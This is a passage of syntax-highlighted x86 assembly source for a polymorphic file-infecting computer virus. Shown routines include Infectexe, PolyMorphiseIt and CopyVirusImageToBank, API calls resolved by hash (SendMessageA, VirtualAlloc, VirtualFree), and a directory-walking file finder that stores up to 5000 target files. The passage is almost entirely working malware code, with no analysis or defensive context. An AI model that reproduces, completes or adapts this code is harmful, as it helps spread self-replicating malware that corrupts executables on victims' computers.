    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetMappedFile</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; set bank pos relative</span><span class="sc0">

    </span><span class="sc6">pushad</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">WM_INFECTEXE</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc2">0FBAC7F60h</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; SendMessageA          </span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; set file stat</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">finishallthat0</span><span class="sc0">          </span><span class="sc1">; nothing to infect much</span><span class="sc0">

    </span><span class="sc5">skipinfect</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">               </span><span class="sc1">; do it again</span><span class="sc0">
</span><span class="sc5">getthisone</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; end of name ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">getthisone</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">loadnext</span><span class="sc0">            </span><span class="sc1">; load next</span><span class="sc0">

</span><span class="sc5">finishallthat0</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">

</span><span class="sc5">LoadAclient</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">64</span><span class="sc0">              </span><span class="sc1">; get a client</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">getbla1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; load untill a non void bee</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">blabla1</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; and non-busy</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">blabl2</span><span class="sc0">

    </span><span class="sc5">blabla1</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">getbla1</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">blabl2</span><span class="sc4">:</span><span class="sc0"> 
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">LoadABank</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetMappedFile</span><span class="sc0">               </span><span class="sc1">; load the mapped file</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">8096</span><span class="sc4">+(</span><span class="sc2">5000</span><span class="sc4">*</span><span class="sc5">structfil</span><span class="sc4">)]</span><span class="sc0">     </span><span class="sc1">; load the mapped pos</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc0">                  

    </span><span class="sc5">getbankit</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],-</span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">; check if pos there</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">quitbank</span><span class="sc0">                </span><span class="sc1">; is full busy</span><span class="sc0">

    </span><span class="sc6">bt</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">getnextbank</span><span class="sc0">             </span><span class="sc1">; check if loaded</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; set busy</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">; finish</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">getnextbank</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">getbankit</span><span class="sc0">               </span><span class="sc1">; check 32 possibility</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">quitbank</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; error bank</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">unloadbank</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetMappedFile</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">8096</span><span class="sc4">+(</span><span class="sc2">5000</span><span class="sc4">*</span><span class="sc5">structfil</span><span class="sc4">)]</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">11111110b</span><span class="sc0">            </span><span class="sc1">; deload bank</span><span class="sc0">
    </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Infectexe</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">wpamval</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetMappedFile</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">BuildModulesImage</span><span class="sc0">       </span><span class="sc1">; flush module</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; virus size</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadModuleTable</span><span class="sc0">         </span><span class="sc1">; </span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">incuservalue</span><span class="sc0">            </span><span class="sc1">; set +1 user value</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getvirusminiversion</span><span class="sc0">     </span><span class="sc1">; now we cant change the code</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">lpamval</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CopyVirusImageToBank</span><span class="sc0">        </span><span class="sc1">; set bank 33 to must done bank</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadBankInfo</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc10">error</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">lpamval</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">virusbank</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">; load version (40)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">version</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">; table offset</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">valuefill</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">; virus size</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">virsize</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ModuleCall</span><span class="sc0">              </span><span class="sc1">; call infect</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decuservalue</span><span class="sc0">            </span><span class="sc1">; set zero user value</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">

</span><span class="sc5">LoadBankInfo</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetMappedFile</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">8096</span><span class="sc4">+(</span><span class="sc5">structfil</span><span class="sc4">*</span><span class="sc2">5000</span><span class="sc4">)+</span><span class="sc2">4</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">64</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">banksize</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+(</span><span class="sc2">32</span><span class="sc4">*</span><span class="sc2">64</span><span class="sc4">)]</span><span class="sc0">       </span><span class="sc1">; return mini buffer loc</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; return buffer loc</span><span class="sc0">

    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">PolyMorphiseIt</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">             </span><span class="sc1">; long stack play just</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">; to keep the regs as it is</span><span class="sc0">
                        </span><span class="sc1">; between modules</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0"> 

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1000h</span><span class="sc0">                   </span><span class="sc1">; MEM_COMMIT</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">banksize</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc2">0A2F83D2Ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">; VirtualAlloc</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1000h</span><span class="sc0">                   </span><span class="sc1">; MEM_COMMIT</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">banksize</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc2">0A2F83D2Ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">; VirtualAlloc</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ModuleCall</span><span class="sc0">              </span><span class="sc1">; call polymorphise</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">repz</span><span class="sc0">    </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4000h</span><span class="sc0">                   </span><span class="sc1">; MEM_DECOMMIT</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">banksize</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc2">0545F6132h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">; VirtualFree</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4000h</span><span class="sc0">                   </span><span class="sc1">; MEM_DECOMMIT</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">banksize</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc2">0545F6132h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">; VirtualFree</span><span class="sc0">

    </span><span class="sc6">popad</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">

    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; File Finder loaded and workin' :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; File Find Structure   !CeC at nullsize-8 (760) = CeC!  start of Find File</span><span class="sc0">
</span><span class="sc1">;       start + 4 =     offset to pointer to end of Directory</span><span class="sc0">
</span><span class="sc1">;       start + 8 = how much down in the dir tree are we ?</span><span class="sc0">
</span><span class="sc1">;       start + 12 =    list of : 0 Number ID</span><span class="sc0">
</span><span class="sc1">;                     4 Handle (number)     </span><span class="sc0">
</span><span class="sc1">;       start + 1024 = Working Buffer Directory</span><span class="sc0">
</span><span class="sc1">;       start + 1024 + 260 = Current FindFirst32 thing</span><span class="sc0">
</span><span class="sc1">;       start + 1024 + 1024 = File storage, marked by CeC!</span><span class="sc0">
</span><span class="sc1">;       Storage start + 4 = File count (limited to 5000)</span><span class="sc0">
</span><span class="sc1">;       Storage start + 8 = File saved entry</span><span class="sc0">
</span><span class="sc1">;           each entry is = 0 = (Name + ) Crc</span><span class="sc0">
</span><span class="sc1">;                   4 = File state</span><span class="sc0">
</span><span class="sc1">;                   8 = Name terminated by a zero char</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">FindAFile</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">nullsize</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc12">'!CeC'</span><span class="sc0">          </span><span class="sc1">; check for a consistent</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">skipinitfile</span><span class="sc0">                </span><span class="sc1">; structure</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc12">'!CeC'</span><span class="sc0">          </span><span class="sc1">; set the structure active</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; zeroize the handles buffer</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc0">                </span><span class="sc1">; for init</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">repz</span><span class="sc0">    </span><span class="sc6">stosb</span><span class="sc0">                   

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1024</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; load the ecx</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                    </span><span class="sc1">; find the current directory</span><span class="sc0">
